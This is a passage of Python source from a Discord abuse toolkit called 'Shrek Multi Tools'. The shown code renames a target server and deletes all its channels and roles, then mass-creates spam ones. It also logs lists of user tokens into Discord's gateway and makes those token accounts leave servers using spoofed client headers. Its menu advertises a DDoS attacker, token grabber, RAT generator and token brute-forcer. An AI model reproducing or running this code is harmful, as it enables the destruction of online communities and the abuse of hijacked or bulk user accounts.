            ra = input(f'''{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}Role Amount: ''')

            print('CAUTION!, There is a high likely hood of your account being locked if you do not have phone verification!')
            time.sleep(5)
            os.system('pause')
            BanAll()

            url = f'https://discord.com/api/v9/guilds/{server}'

            image = "data:image/jpeg;base64,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"

            e = requests.patch(url, headers=headerrs, json={'name':"Nuked By Shrek-Multi-Tools", 'icon':image})

            channels = open('data/channels.txt')
            roles = open('data/roles.txt')

            for channel in channels:
                threading.Thread(target=self.DeleteChannels, args=(server, channel,)).start()
            for role in roles:
                threading.Thread(target=self.DeleteRoles, args=(server, role,)).start()
            for i in range(int(cha)):
                threading.Thread(target=self.SpamChannels, args=(server, chh,)).start()
            for i in range(int(ra)):
                threading.Thread(target=self.SpamRoles, args=(server, rn,)).start()

        async def Menu(self):
            await self.Scrape()
            time.sleep(2)
            await self.NukeStart()
            time.sleep(2)
            await self.Menu()

        @client.event
        async def on_ready(*Args):
            await UNuker().Menu()

        def Check(self):
            client.run(token, bot=False)

    if __name__ == "__main__":
        UNuker().Check()

  def onliner():
    cls()
    ctypes.windll.kernel32.SetConsoleTitleW("Shrek Multi Tools | Token Onliner")
    options5 = input(f'''
    {Fore.GREEN}
 ▒█████   ███▄    █  ██▓     ██ ███▄    █ ▓█████ ██▀███  
▒██▒  ██▒ ██ ▀█   █ ▓██▒   ▒▓██ ██ ▀█   █ ▓█   ▀▓██ ▒ ██▒
▒██░  ██▒▓██  ▀█ ██▒▒██░   ░▒██▓██  ▀█ ██▒▒███  ▓██ ░▄█ ▒
▒██   ██░▓██▒  ▐▌██▒▒██░    ░██▓██▒  ▐▌██▒▒▓█  ▄▒██▀▀█▄  
░ ████▓▒░▒██░   ▓██░░██████ ░██▒██░   ▓██░░▒████░██▓ ▒██▒
░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ░ ▒░▓   ░▓ ░ ▒░   ▒ ▒ ░░ ▒░ ░ ▒▓ ░▒▓░
  ░ ▒ ▒░ ░ ░░   ░ ▒░░ ░ ▒    ▒ ░ ░░   ░ ▒░ ░ ░    ░▒ ░ ▒░
░ ░ ░ ▒     ░   ░ ░   ░ ░    ▒    ░   ░ ░    ░     ░   ░ 
    ░ ░           ░     ░    ░          ░    ░     ░     

{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}make sure you put tokens in [{Fore.WHITE}tokens.txt]

{Fore.GREEN}[{Fore.WHITE}01{Fore.GREEN}] {Fore.WHITE}ONLINER
{Fore.GREEN}[{Fore.WHITE}02{Fore.GREEN}] {Fore.WHITE}GAME ACTIVITY
{Fore.GREEN}[{Fore.WHITE}03{Fore.GREEN}] {Fore.WHITE}Shrek ONLINER 

    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE}''')

    if options5 in ['01','1']:
        def onliner1():
            with open('tokens.txt','r') as tokens:
                for line in tokens:
                    ws = websocket.WebSocket()

                    ws.connect('wss://gateway.discord.gg/?v=6&encoding=json')

                    auth = {'op': 2,
                            'd': {'token': line,
                                    'properties': {'$os': sys.platform,
                                                    '$browser': 'RTB',
                                                    '$device': f"{sys.platform} Device"},
                                    'presence': {'game': None,
                                                'status': 'Online',
                                                'since': 0,
                                                'afk': False}},
                            's': None,
                            't': None}
                    ws.send(json.dumps(auth))

        while __name__ == '__main__':
            onliner1()

    elif options5 in ['02','2']:
        game = input(f'''{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}What do you want the game status for the tokens to be?: ''')
        def onliner2():
            with open('tokens.txt','r') as tokens:
                for line in tokens:
                    ws = websocket.WebSocket()
                    ws.connect('wss://gateway.discord.gg/?v=6&encoding=json')
                    gjs = {'name': game,
                        'type': 0}
                    auth = {'op': 2,
                            'd': {'token': line,
                                'properties': {'$os': sys.platform,
                                                '$browser': 'RTB',
                                                '$device': f"{sys.platform} Device"},
                                'presence': {'game': gjs,
                                            'status': 'Online',
                                            'since': 0,
                                            'afk': False}},
                            's': None,
                            't': None}
                    ws.send(json.dumps(auth))

        while __name__ == '__main__':
            onliner2()


    elif options5 in ['03','3']:
        game = 'Shrek On Top <3'
        def onliner3():
            with open('tokens.txt','r') as tokens:
                for line in tokens:
                    ws = websocket.WebSocket()
                    ws.connect('wss://gateway.discord.gg/?v=6&encoding=json')
                    gjs = {'name': game,
                        'type': 0}
                    auth = {'op': 2,
                            'd': {'token': line,
                                'properties': {'$os': sys.platform,
                                                '$browser': 'RTB',
                                                '$device': f"{sys.platform} Device"},
                                'presence': {'game': gjs,
                                            'status': 'Online',
                                            'since': 0,
                                            'afk': False}},
                            's': None,
                            't': None}
                    ws.send(json.dumps(auth))

        while __name__ == '__main__':
            onliner3()

  def leaver():
    cls()
    ctypes.windll.kernel32.SetConsoleTitleW("Shrek Multi Tools | Server Leaver")
    print(f'''
{Fore.GREEN}
 ██▓    ▓█████ ▄▄▄      ██▒   █▓ ▓█████ ██▀███  
▓██▒    ▓█   ▀▒████▄   ▓██░   █▒ ▓█   ▀▓██ ▒ ██▒
▒██░    ▒███  ▒██  ▀█▄  ▓██  █▒░ ▒███  ▓██ ░▄█ ▒
▒██░    ▒▓█  ▄░██▄▄▄▄██  ▒██ █░░ ▒▓█  ▄▒██▀▀█▄  
░██████▒░▒████▒▓█   ▓██   ▒▀█░  ▒░▒████░██▓ ▒██▒
░ ▒░▓  ░░░ ▒░ ░▒▒   ▓▒█   ░ ▐░  ░░░ ▒░ ░ ▒▓ ░▒▓░
░ ░ ▒  ░ ░ ░  ░ ░   ▒▒    ░ ░░  ░ ░ ░    ░▒ ░ ▒ 
  ░ ░      ░    ░   ▒        ░      ░    ░░   ░ 
    ░  ░   ░        ░        ░  ░   ░     ░     

    ''')
    serverid = input(f'''{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}What is the server id you want to leave?: ''')
    url = f'https://discord.com/api/v9/users/@me/guilds/{serverid}'

    tokens = []
    token = []

    with open('tokens.txt','r') as f:
        for line in f:
            tokens.append(line)

        for element in tokens:
            token.append(element.strip())

        length = len(token)

    for x in range(length):
        header = {
            "authority": "discord.com",
            "path": f"/api/v9/users/@me/settings",
            'method': 'PATCH',
            "scheme": "https",
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US",
            "Authorization": f"{token[x]}",
            "content-length": "0",
            "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
            "origin": "https://discord.com",
            'referer': 'https://discord.com/channels/@me',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": useragent(),
            "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
            "x-debug-options": "bugReporterEnabled",
            "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
        }

        r = requests.delete(url, headers=header)
        if r.status_code == 200 or 204:
            print('Left Guild!')  
  def settings():
    global Setting
    cls()
    ctypes.windll.kernel32.SetConsoleTitleW("Shrek Multi Tools | Webhook Raiders")
    Setting = input(f'''
{Fore.GREEN}
{Fore.GREEN}
  ██████  ▓█████▄▄▄█████▓▄▄▄█████▓  ██▓ ███▄    █  ▄████ 
▒██    ▒  ▓█   ▀▓  ██▒ ▓▒▓  ██▒ ▓▒▒▓██▒ ██ ▀█   █  ██▒ ▀█
░ ▓██▄    ▒███  ▒ ▓██░ ▒░▒ ▓██░ ▒░▒▒██▒▓██  ▀█ ██▒▒██░▄▄▄
  ▒   ██▒ ▒▓█  ▄░ ▓██▓ ░ ░ ▓██▓ ░ ░░██░▓██▒  ▐▌██▒░▓█  ██
▒██████▒▒▒░▒████  ▒██▒ ░   ▒██▒ ░ ░░██░▒██░   ▓██░▒▓███▀▒
▒ ▒▓▒ ▒ ░░░░ ▒░   ▒ ░░     ▒ ░░    ░▓  ░ ▒░   ▒ ▒ ░▒   ▒ 
░ ░▒  ░ ░░ ░ ░      ░        ░    ░ ▒ ░░ ░░   ░ ▒░ ░   ░ 
░  ░  ░      ░    ░        ░      ░ ▒ ░   ░   ░ ░  ░   ░ 
      ░  ░   ░                      ░           ░      ░ 


  {Fore.GREEN}[{Fore.WHITE}01{Fore.GREEN}] {Fore.WHITE}Change User Name
  {Fore.GREEN}[{Fore.WHITE}02{Fore.GREEN}] {Fore.WHITE}Help channel{Fore.GREEN}({Fore.WHITE}discord{Fore.GREEN})
  {Fore.GREEN}[{Fore.WHITE}03{Fore.GREEN}] {Fore.WHITE}Meaning Of Commands
  {Fore.GREEN}[{Fore.WHITE}00{Fore.GREEN}] Exit

    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE}''')


    if Setting in ['1','01']:
        cls()
        ctypes.windll.kernel32.SetConsoleTitleW("Shrek Multi Tools | User Name Changer")  
        new_user_name = print(f"""
{Fore.GREEN}
 █    ██   ██████  ▓█████ ██▀███       ███▄    █  ▄▄▄      ███▄ ▄███▓ ▓█████
 ██  ▓██▒▒██    ▒  ▓█   ▀▓██ ▒ ██▒     ██ ▀█   █ ▒████▄   ▓██▒▀█▀ ██▒ ▓█   ▀
▓██  ▒██░░ ▓██▄    ▒███  ▓██ ░▄█ ▒    ▓██  ▀█ ██▒▒██  ▀█▄ ▓██    ▓██░ ▒███  
▓▓█  ░██░  ▒   ██▒ ▒▓█  ▄▒██▀▀█▄      ▓██▒  ▐▌██▒░██▄▄▄▄██▒██    ▒██  ▒▓█  ▄
▒▒█████▓ ▒██████▒▒▒░▒████░██▓ ▒██▒    ▒██░   ▓██░▒▓█   ▓██▒██▒   ░██▒▒░▒████
░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░░░░ ▒░ ░ ▒▓ ░▒▓░    ░ ▒░   ▒ ▒ ░▒▒   ▓▒█░ ▒░   ░  ░░░░ ▒░ 
░░▒░ ░ ░ ░ ░▒  ░ ░░ ░ ░    ░▒ ░ ▒     ░ ░░   ░ ▒░░ ░   ▒▒ ░  ░      ░░ ░ ░  
 ░░░ ░ ░ ░  ░  ░      ░    ░░   ░        ░   ░ ░   ░   ▒  ░      ░       ░  
   ░           ░  ░   ░     ░                  ░       ░         ░   ░   ░  

        """)

        new_user_name = input(f"""{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}Enter your new username: """)
        user_name = new_user_name
        with open(user_name_file_path, "w") as file:
            file.write(user_name)
        print(Fore.GREEN +f'''
{Fore.YELLOW}[{Fore.WHITE}INFO{Fore.YELLOW}] {Fore.WHITE}Username updated successfully, {Fore.MAGENTA}({Fore.WHITE}restart the programe{Fore.MAGENTA}){Fore.WHITE}!
''') 
        os.system('pause')
        tool()
    elif Setting in ['2','02']:
      webbrowser.open('https://discord.gg/mQVvRGfs46')
      return
    elif Setting in ['3','03']:
        cls()
        print(f"""
{Fore.GREEN}> {Fore.WHITE}TOKEN NUKERS: Comming Soon...
{Fore.GREEN}> {Fore.WHITE}TOKEN JOINER: Comming Soon...
{Fore.GREEN}> {Fore.WHITE}TOKEN LEAVER: Comming Soon...
{Fore.GREEN}> {Fore.WHITE}TOKEN ONLINER: Comming Soon...
{Fore.GREEN}> {Fore.WHITE}WEBHOOK RAIDER Comming Soon...
{Fore.GREEN}> {Fore.WHITE}SERVER NUKER: Comming Soon...
{Fore.GREEN}> {Fore.WHITE}SERVER SPAMMER: Comming Soon...
{Fore.GREEN}> {Fore.WHITE}FRIEND SPAMMER: Comming Soon...
{Fore.GREEN}> {Fore.WHITE}DDOS ATTACKER: Comming Soon...
{Fore.GREEN}> {Fore.WHITE}TOKEN GEN: Comming Soon...
{Fore.GREEN}> {Fore.WHITE}NITRO GEN: Comming Soon...
{Fore.GREEN}> {Fore.WHITE}PROXY GEN: Comming Soon...
{Fore.GREEN}> {Fore.WHITE}GRABBER GEN: Comming Soon...
{Fore.GREEN}> {Fore.WHITE}QR GRABBER GEN: Comming Soon...
{Fore.GREEN}> {Fore.WHITE}RAT BOT GEN: Comming Soon...
{Fore.GREEN}> {Fore.WHITE}ID GEN: Comming Soon...
{Fore.GREEN}> {Fore.WHITE}NAME GEN: Comming Soon...
{Fore.GREEN}> {Fore.WHITE}TOKEN BRUTE-FORCER: Comming Soon...
{Fore.GREEN}> {Fore.WHITE}TOKEN CHECKER: Comming Soon...
{Fore.GREEN}> {Fore.WHITE}TOKEN LOGIN: Comming Soon...
{Fore.GREEN}> {Fore.WHITE}TOKEN INFO: Comming Soon...
{Fore.GREEN}> {Fore.WHITE}PFP CHANGER: Comming Soon...
{Fore.GREEN}> {Fore.WHITE}HYPEQUAD CHANGER: Comming Soon...
{Fore.GREEN}> {Fore.WHITE}BIO CHANGER: Comming Soon...
{Fore.GREEN}> {Fore.WHITE}ID TO TOKEN: Comming Soon...
